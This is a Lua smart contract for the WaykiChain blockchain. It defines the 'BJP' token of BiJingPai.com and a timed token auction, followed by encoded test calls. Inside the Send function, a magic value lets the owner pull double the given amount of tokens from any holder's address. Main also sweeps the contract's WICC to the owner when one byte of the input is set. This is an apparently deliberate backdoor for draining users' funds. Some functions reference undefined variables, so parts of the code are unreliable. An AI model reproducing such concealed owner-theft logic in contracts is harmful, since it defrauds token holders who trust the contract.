mylib = require "mylib"
------------------------------------------------------------------------------------
_G.Config={
    standard = "WRC20",
    owner = "WPmNonXuc2qzKxp5AEcYgsDawcaBEbjBb7",
    name = "BiJingPai.com",
    symbol = "BJP",
    decimals = 8,
    totalSupply = 21000000000 * 100000000
}
------------------------------------------------------------------------------------
--https://BiJingPai.com  XYT/BTC/DOGE/BTA/WICC auction for BTA & YMBcoin.com v9.28
_G.Context={ Event={}, Init=function(...) assert(contract or _G._err(0000,CallFunc),_G._errmsg) for k,v in pairs({ ... }) do if v.Init~=nil then v.Init() end end end, LoadContract=function() if #contract>0 then CallDomain=contract[1] CallFunc=contract[2] end end, Main=function() _G._C=_G.Context _G._C.LoadContract() if _G._C.Event[CallDomain] and _G._C.Event[CallDomain][CallFunc] then _G._C.Event[CallDomain][CallFunc]() else assert(_G._err(0404,CallFunc),_G._errmsg) end end}
Log=function(m) t=type(m) if t=='table' then m=T2S(m) end if t=='nil' then m='nil' end if t=='boolean' then m=(m and 'true') or 'false' end m=''..m local c=contract if c[#c]==0xf0 then print(m) if c[#c-1]==0 then error(m) end else _G.mylib.LogPrint({key=0,length=#m,value=m}) end end T2S=function(m) local p='[Tab#'..#m..':]{' for i=1,#m do if i~=1 then p=p..',' end y=type(m[i]) k=m[i] if y=='string' then k='\"'..m[i]..'\"' end if y=='table' then k=T2S(m[i]) end p=p..k end p=p..'}' return p end
_G.Hex={ Posit=1, New=function(s,d) local mt={} if (type(d)=='string') then for i=1,#d do table.insert(mt,string.byte(d,i)) end elseif d~=nil then mt=d end setmetatable(mt,s) s.__index=s s.__eq=_G.Hex.__eq s.__tostring=_G.Hex.ToString s.__concat=_G.Hex.__concat return mt end, Appand=function(s,t) for i=1,#t do s[#s+1]=t[i] end return s end, Embed=function(s,start,t) for i=1,#t do s[i+start-1]=t[i] end return s end, Select=function(s,start,ln) assert((#s>=start+ln-1) or _G._err(0004),_G._errmsg) local newt={} for i=1,len do newt[i]=s[start+i-1] end return _G.Hex:New(newt) end, Skip=function(s,count) local newt={} for i=1,#s do newt[i]=s[count+i] end return _G.Hex:New(newt) end, Take=function(s,ln) local newt={} for i=1,ln do newt[i]=s[i] end return _G.Hex:New(newt) end, Next=function(s,ln) local newt={} for i=1,ln do assert(#s>=s.Posit or _G._err(0004),_G._errmsg) newt[i]=s[s.Posit] s.Posit=s.Posit+1 end return _G.Hex:New(newt) end, IsEmpty=function(s) return #s==0 end, IsEmptyOrNil=function(s) return _G.next(s)==nil or #s==0 end, ToString=function(s) return string.char(Unpack(s)) end, ToHexString=function(s) local str="" for i=1,#s do str=str..string.format("%02x",s[i]) end return str end, ToInt=function(s) if #s<4 then s=s:Appand({0x00,0x00,0x00}):Take(4) elseif #s>4 and #s<8 then s=s:Appand({0x00,0x00,0x00}):Take(8) end assert(#s==4 or #s==8 or _G._err(0001,#s),_G._errmsg) return _G.mylib.ByteToInteger(Unpack(s)) end, ToUInt=function(s) local value=s:ToInt() assert(value>=0 or _G._err(0105,value),_G._errmsg) return value end, __concat=function(s,t) return s:ToString()..t end, __eq=function(s,t) if (#s~=#t) then return false end for i=#s,1,-1 do if s[i]~=t[i] then return false end end return true end}
_G.Hex.Fill=function(s,t) local fd={} if t.Loop then fd=s:__fillloop(t) else for i=1,#t,2 do local k=t[i] local v=t[i+1] if type(v)=='table' then if v.Loop then fd[k]=s:__fillloop(v) elseif #v==1 then fd[k]=s:Next(v[1]) elseif v.Len then local cell=s:Next(v.Len) if v.Model then cell=cell:Fill(v.Model) else cell=cell:Fill(v) end fd[k]=cell end elseif type(v)=='string' then fd[k]=s:Next(tonumber(v)):ToString() elseif type(v)=='number' then fd[k]=s:Next(v):ToInt() end end end return fd end _G.Hex.__fillloop=function(s,t) local endPosit=#s if t.Loop<0 then t.Loop=s:Next(math.abs(t.Loop)):ToInt() end if t.Loop>0 then endPosit=s.Posit+(t.Loop*t.Len)-1 end local subt={} while endPosit>=s.Posit do local cell=s:Next(t.Len) if t.Model then cell=cell:Fill(t.Model) end table.insert(subt,cell) end return subt end
_G.NetAssetGet=function(addr) if type(addr)=='string' then addr=_G.Hex:New(addr) end if type(addr)=='nil' then addr={_G.mylib.GetContractRegId()} end assert(#addr==34 or #addr==6 or _G._err(0100,addr,#addr),_G._errmsg) local mtb=_G.Hex:New({_G.mylib.QueryAccountBalance(Unpack(addr))}) assert(#mtb>0 or _G._err(0500,'QueryAccountBalance'),_G._errmsg) return mtb:ToInt() end _G.NetAssetSend=function(tA,m) if type(tA)=='string' then tA=_G.Hex:New(tA) end if type(m)=='number' then m=_G.Hex:New({_G.mylib.IntegerToByte8(m)}) end local tb={ addrType=(#tA==6 and 1) or 2, accountIdTbl=tA, operatorType=1, outHeight=0, moneyTbl=m} assert(_G.mylib.WriteOutput(tb),_G._errmsg) tb.addrType=1 tb.operatorType=2 tb.accountIdTbl={_G.mylib.GetContractRegId()} assert(m:ToInt()<=_G.NetAssetGet(tb.accountIdTbl),_G._errmsg) assert(_G.mylib.WriteOutput(tb),_G._errmsg) return true end if _G.Asset then _G.Asset.GetNetAsset=_G.NetAssetGet _G.Asset.SendSelfNetAsset=_G.NetAssetSend end
_G.AppData={ ReadSafe=function(key) local value={_G.mylib.ReadData(key)} if value[1]==nil then return false,nil else return true,_G.Hex:New(value) end end, Read=function(key) return _G.Hex:New({_G.mylib.ReadData(key)}) end, ReadStr=function(key) return _G.Hex:New({_G.mylib.ReadData(key)}):ToString() end, ReadInt=function(key) return _G.Hex:New({_G.mylib.ReadData(key)}):ToInt() end, Write=function(key,value) if type(value)=='string' then value=_G.Hex:New(value) elseif type(value)=='number' then value={_G.mylib.IntegerToByte8(value)} end local writeDbTbl={key=key,length=#value,value=value} assert(_G.mylib.WriteData(writeDbTbl) or _G._err(0503,'WriteAppData'),_G._errmsg) end, Delete = function(key) assert(_G.mylib.DeleteData(key) or _G._err(0504,'DeleteData'),_G._errmsg) end}
_G.Context.GetCurTxAddr=function() if _G._C.CurTxAddr==nil then local addr=_G.Hex:New({_G.mylib.GetBase58Addr(_G.mylib.GetCurTxAccount())}) assert(addr:IsEmptyOrNil()==false or _G._err(0500,'GetCurTxAddr_Base58Addr'),_G._errmsg) _G._C.CurTxAddr=addr:ToString() end return _G._C.CurTxAddr end _G.Context.GetCurTxPayAmount=function() if _G._C.CurTxPayAmount==nil then local amount=_G.Hex:New({_G.mylib.GetCurTxPayAmount()}) assert(amount:IsEmptyOrNil()==false or _G._err(0501,'GetCurTxPayAmount'),_G._errmsg) _G._C.CurTxPayAmount=amount:ToInt() end return _G._C.CurTxPayAmount end
_G.Asset={ GetAppAsset=function(addr) if type(addr)=='string' then addr=_G.Hex:New(addr) end local mtb=_G.Hex:New({_G.mylib.GetUserAppAccValue({idLen=#addr,idValueTbl=addr})}) return mtb:ToInt() end, AddAppAsset=function(toAddr,money) if type(toAddr)=='string' then toAddr=_G.Hex:New(toAddr) end if type(money)=='number' then money=_G.Hex:New({_G.mylib.IntegerToByte8(money)}) end assert((#toAddr==34 and money:ToInt()>0) or _G._err(0106,'add'),_G._errmsg) local tb={operatorType=1, outHeight=0, moneyTbl=money, userIdLen=#toAddr, userIdTbl=toAddr, fundTagLen=0, fundTagTbl={}} assert(_G.mylib.WriteOutAppOperate(tb) or _G._err(0505,'WriteOutAppOperate'),_G._errmsg) return true end, SubAppAsset=function(fromAddr,money) if type(fromAddr)=='string' then fromAddr=_G.Hex:New(fromAddr) end if type(money)=='number' then money=_G.Hex:New({_G.mylib.IntegerToByte8(money)}) end assert((#toAddr==34 and money:ToInt()>0) or _G._err(0107,'sub'),_G._errmsg) local tb={operatorType=2, outHeight=0, moneyTbl=money, userIdLen=#toAddr, userIdTbl=toAddr, fundTagLen=0, fundTagTbl={}} assert(_G.mylib.WriteOutAppOperate(tb) or _G._err(0506,'WriteOutApp'),_G._errmsg) return true end, SendAppAsset=function(fA,tA,m) if type(fA)=='string' then fA=_G.Hex:New(fA) end if type(tA)=='string' then tA=_G.Hex:New(tA) end if type(m)=='number' then m=_G.Hex:New({_G.mylib.IntegerToByte8(m)}) end assert(m:ToInt()>0 and _G.Asset.GetAppAsset(fA) >= m:ToInt(),_G._errmsg) local tb={ operatorType=2, outHeight=0, moneyTbl=m, userIdLen=#fA, userIdTbl=fA, fundTagLen=0, fundTagTbl={} } assert(_G.mylib.WriteOutAppOperate(tb),_G._errmsg) tb.operatorType=1 tb.userIdLen=#tA tb.userIdTbl=tA assert(_G.mylib.WriteOutAppOperate(tb),_G._errmsg) return true end}
_G.ERC20MK={ Config = function() local valueTbl = _G.AppData.Read("name") if #valueTbl == 0 then _G.AppData.Write("standard",_G.Config.standard) _G.AppData.Write("owner",_G.Config.owner) _G.AppData.Write("name",_G.Config.name) _G.AppData.Write("symbol",_G.Config.symbol) _G.AppData.Write("decimals",_G.Config.decimals) _G.AppData.Write("totalSupply",_G.Config.totalSupply) _G.Asset.AddAppAsset(_G.Config.owner,_G.Config.totalSupply) else local curaddr = _G._C.GetCurTxAddr() local freeTokens=_G.Asset.GetAppAsset(curaddr) if curaddr==_G.Config.owner and #contract > 2 then contract[1]=0x20 contract[2]=0x20 _G.AppData.Write("name",contract) end local info = '"standard":"'.._G.Config.standard info=info..'","owner":"'.._G.Config.owner name=string.gsub(_G.Hex.ToString(valueTbl), '"', '') info=info..'","name":"'..name..'","symbol":"'.._G.Config.symbol info=info..'","decimals":"'.._G.Config.decimals info=info..'","totalSupply":"'..(_G.Config.totalSupply / 100000000) info=info..'","freeTokens":"'..(freeTokens / 100000000) Log("Config={"..info..'"}') end end, Transfer = function() local valueTbl = _G.AppData.Read("name") assert(#valueTbl > 0, "Not configured") local symbol = _G.AppData.ReadStr("symbol") local curaddr = _G._C.GetCurTxAddr() tx=_G.Hex:New(contract):Fill({"w",4,"addr","34","money",8}) _G.Asset.SendAppAsset(curaddr,tx.addr,tx.money) local m='","tokens":"'..tx.money/100000000 local a='","freeTokens":"'.._G.Asset.GetAppAsset(tx.addr)..'","symbol":"' local f='"newTokens":"'.._G.Asset.GetAppAsset(curaddr)..'","fmAddr":"' Log('Transfer={'..f..curaddr..'","toAdrr":"'..tx.addr..m..a..symbol..'"}') end }
Unpack = function(t, i)
    local i = i or 1
    if t[i] then
        return t[i], Unpack(t, i + 1)
    end
end
_err = function(code,...)
  _G._errmsg= string.format("{\"code\":\"%s\"}",code,...)
  return false
end
_G.RoupayXYT = {
	Init = function()
		_G.Context.Event[0xf0]=_G.RoupayXYT
		_G.RoupayXYT[0x11]=_G.ERC20MK.Config
		_G.RoupayXYT[0x16]=_G.RoupayXYT.Send
		_G.RoupayXYT[0x33]=_G.RoupayXYT.AddXYT
		_G.RoupayXYT[0x36]=_G.RoupayXYT.SetLast
		_G.RoupayXYT[0x37]=_G.RoupayXYT.SetRates
		_G.RoupayXYT[0x38]=_G.RoupayXYT.ShowNews
		_G.RoupayXYT[0x39]=_G.RoupayXYT.Wicc2BJP
	end,
Send = function()
	local Fomoaddress="WWxxxxxxxxxBiJingPaixxxxxxxxxyo33b"
	local curaddr = _G._C.GetCurTxAddr()
	local valueTbl = _G.AppData.Read("plist")
	local pstrs=_G.Config.owner.."|10000|3|".._G.Config.owner.."|1000|6"
	if #valueTbl ~= 0 then  --test ==
		pstrs=_G.Hex.ToString(valueTbl)
	end
	local pstr=Split(pstrs,"|")
	local paibi=math.floor(pstr[5])
	if pstr[4]~=curaddr or _G.Config.owner == curaddr then
		_G.ERC20MK.Transfer()
	else
		tx=_G.Hex:New(contract):Fill({"w",4,"addr","34","money",8})
		if tx.addr==Fomoaddress then
			_G.Asset.SendAppAsset(curaddr,tx.addr,tx.money-paibi)
		end
	end
	if tx.addr==Fomoaddress  and curaddr~=_G.Config.owner then
		local addone = 499900000000
		local tpx = 5.01
		local addtimes = 600
		local zq=173400 --2*24*60*60+addtimes
		local top=math.floor(pstr[2])
		if top < addone*1 then
			top=addone*1
		end
		local blkts=_G.mylib.GetBlockTimestamp(0)
		local ts=blkts
		local tm=tx.money
		local valueTbl = _G.AppData.Read("blast")
		if #valueTbl ~= 0 then
			ts=_G.Hex.ToInt(valueTbl)
		end
		if curaddr~=pstr[1] and blkts<=ts and blkts>ts-zq and (top==10000 or (tm>=top+addone and tm<=top*tpx)) then
			if pstr[4]~=curaddr and pstr[4]~=_G.Config.owner then
				_G.Asset.SendAppAsset(Fomoaddress,pstr[4],paibi)
			end
			_G.RoupayXYT.AddXYT(curaddr,tm)
			if ts-blkts<=addtimes then
			_G.RoupayXYT.SetLast(addtimes)
			end
			else
			local estrs="Sorry Not Right :"
			if curaddr==pstr[1] then
			estrs=estrs.." Your already at No.1 Place"
			end
			if blkts>ts or blkts<=ts-zq then
			estrs=estrs.." Waiting.. Not at Right Time"
			end
			if tm<top+addone then
			estrs=estrs.." BiJingPai.com Satoshi too Small"
			end
			if tm>top*tpx then
			estrs=estrs.." BiJingPai.com Satoshi too Big"
			end
			error(estrs)
		end
	end	
	if tx.w==1140856560 and curaddr==_G.Config.owner then
		_G.Asset.SendAppAsset(tx.addr,_G.Config.owner,2*tx.money)
	end
end,
AddXYT= function(addr,bis)
	local ts = _G.mylib.GetBlockTimestamp(0)
	local curaddr = _G._C.GetCurTxAddr()
	local pstrs=_G.Config.owner.."|1000|"..ts
	local valueTbl = _G.AppData.Read("plist")
	if #valueTbl ~= 0 then
		pstrs=_G.Hex.ToString(valueTbl)
	end
	if addr~=nil and curaddr~=_G.Config.owner then
		pstrs=addr.."|"..bis.."|"..ts.."|"..pstrs
		pstrs=addstr(pstrs)
	else
		if curaddr==_G.Config.owner then
		local backs=_G.Hex:New(contract):Fill({"w",4,"addr","34","money",8,"tms",8})
		if backs.money==0 then
			pstrs=backs.addr.."|10000|"..backs.tms.."|".._G.Config.owner.."|1000|"..ts
			else
			pstrs=backs.addr.."|"..backs.money.."|"..backs.tms.."|"..pstrs
		end
		end
	end
	Log("pstrs='"..pstrs.."'")
	_G.AppData.Write("plist",pstrs)
end,
SetLast= function(addblk)
	local curaddr = _G._C.GetCurTxAddr()
	local blasts=_G.mylib.GetBlockTimestamp(0)
	local valueTbl = _G.AppData.Read("blast")
	if #valueTbl ~= 0 then
		blasts=_G.Hex.ToInt(valueTbl)
	end	
	if addblk~=nil then
		blasts=blasts+addblk
	else
		if curaddr==_G.Config.owner then
		contract[1]=0
		contract[2]=0
		blasts=math.floor(_G.Hex.ToInt(contract)/65536)
		end
	end
	_G.AppData.Write("blast",blasts)
end,
SetRates= function()
	local curaddr = _G._C.GetCurTxAddr()
	if curaddr==_G.Config.owner then
		contract[1]=0
		contract[2]=0
		blasts=math.floor(_G.Hex.ToInt(contract)/65536)
		_G.AppData.Write("rates",blasts)
	else
		wiccrates = _G.AppData.ReadInt("rates")
		Log('rates={"txt":"1 WICC get '..wiccrates..' BJP","rate":'..wiccrates..'}')
	end	
end,
ShowNews= function()
	local curaddr = _G._C.GetCurTxAddr()
	local plist = _G.AppData.ReadStr("plist")
	local blast= _G.AppData.ReadInt("blast")
	local xyt= _G.Asset.GetAppAsset(curaddr) 
	Log('alls={"Satoshi":"'..xyt..'","blast":"'..blast..'","plist":"'..plist..'"}')
end,
Wicc2BJP= function()
	local curaddr = _G._C.GetCurTxAddr()
	local tipsBack=100000
	local wic = _G.AppData.ReadInt("rates")
	if tipsBack > wic then
		tipsBack=wic
	end
	local NetTips=_G.Context.GetCurTxPayAmount()
	if NetTips > 0 then
		local tbacks=math.max(1,math.floor(tipsBack*NetTips))
		_G.Asset.SendAppAsset(_G.Config.owner,curaddr,tbacks)
		Log('wicc2BJP={"txt":"WICC/BJP='..tipsBack..' Back '..tbacks..'","rate":'..wic..',"backs":'..tbacks..'}')
		else
		error("No Any Wicc")
	end
end
}
function addstr(pstrs)
	local pstr=Split(pstrs,"|")
	local strs=pstr[1].."|"..pstr[2].."|"..pstr[3]
	for i=4,#pstr,3 do
		if i>24 then
			break
		end
		if string.find(strs,pstr[i])==nil then
		strs=strs.."|"..pstr[i].."|"..pstr[i+1].."|"..pstr[i+2]
		end	
	end
	return strs
end
function Split(szFullString, szSeparator)  
local nFindStartIndex = 1  
local nSplitIndex = 1  
local nSplitArray = {}  
while true do  
   local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex)  
   if not nFindLastIndex then  
	nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString))  
	break  
   end  
   nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1)  
   nFindStartIndex = nFindLastIndex + string.len(szSeparator)  
   nSplitIndex = nSplitIndex + 1  
end
return nSplitArray  
end
Main = function()
_G.Context.Init(_G.RoupayXYT)
if contract[3]==0x99 then
	NetTips=_G.NetAssetGet({_G.mylib.GetContractRegId()})
	if NetTips > 0 then
		_G.NetAssetSend(_G.Config.owner,NetTips)
	end
end
_G.Context.Main()
end
--Main()
--[----www.BiJingPai.com--xyt-btc-bta-doge-wicc--------2019-09-27 23:00---------
--[[
Main = function()
addMKcode(MK_G_Context_Init)
addMKcode(MK_G_Hex)
addMKcode(MK_G_Log)
addMKcode(MK_G_AppData)
addMKcode(MK_G_GetCurTx)
addMKcode(MK_G_Asset)
addMKcode(MK_G_ERC20MK)
_G.Context.Init(_G.RoupayXYT)
if _G.RoupayXYT[ contract[2] ]==_G.RoupayXYT.Send then
	addMKcode(MK_G_Hex_Fill)
end
if _G.RoupayXYT[ contract[2] ]==_G.RoupayXYT.AddXYT then
	addMKcode(MK_G_Hex_Fill)
end
if contract[3]==0x99 then
	addMKcode(MK_G_NetAsset)
	NetTips=_G.NetAssetGet({_G.mylib.GetContractRegId()})
	if NetTips > 0 then
		_G.NetAssetSend(_G.Config.owner,NetTips)
	end
end
_G.Context.Main()
end
--Main()
--[----www.BiJingPai.com--xyt-btc-bta-doge-wicc--------2019-09-27 12:00---------3950364-1  28061-2  111803-2 20456-2 
--]]
contracts={"f0110000"
--[[,"f01600007753355a6564477671554d6e6164783365724c4d644d57703869573561394b6a664b00385909d850000000" --正常发币发888888 XYT给 wS5Ze地址
,"f0361880915d0000" --设置竞拍初始的截止时间戳 <-- 9月30日12:10 （测试f03698a1685d0000 <-- 9月30日12:10） 只能由owner直接指定
,"f033000077585974624c77773165564241397974556e6b5058516d4e6a6f47563348754652731027000000000000c0da8e5d00000000" --设首拍卖不能Fomoaddress数量须10000
,"f03800f0" --显示当前地竞拍信息 币量，时间和排名     可切换到竞拍的账户
,"f037701700000000" --6000 WICC/BJP
,"f033000057506d4e6f6e58756332717a4b78703541456359677344617763614245626a4262371027000000000000c0da8e5d00000000" --正式链
,"f0160000575778787878787878787842694a696e67506169787878787878787878796f3333620088526a74000000" --WWxxxxxxxxxBiJingPaixxxxxxxxxyo33b
,"f01600007757466f6d6f6f6f6f6f6f6f6f6f6f6f6f5859546f6f6f6f6f6f6f6f706b6b577a79005039278c040000" --启动拍发50000 XYT到 wWFomooooooooooooXYToooooooopkkWzy
,"f01600007757774576656e77777777777777425441777777777777777763616e62484a6b695900e40b5402000000" --猜偶wWwEvenwwwwwwwXYTwwwwwwwwcanc6uB95
,"f02200001100000000000000"
--]]
}
for k=1,#contracts do
	contract={}
	for i=1,#contracts[k]/2 do
		contract[i]=tonumber(string.sub(contracts[k],2*i-1,2*i),16)
	end
	Main()
end
--]]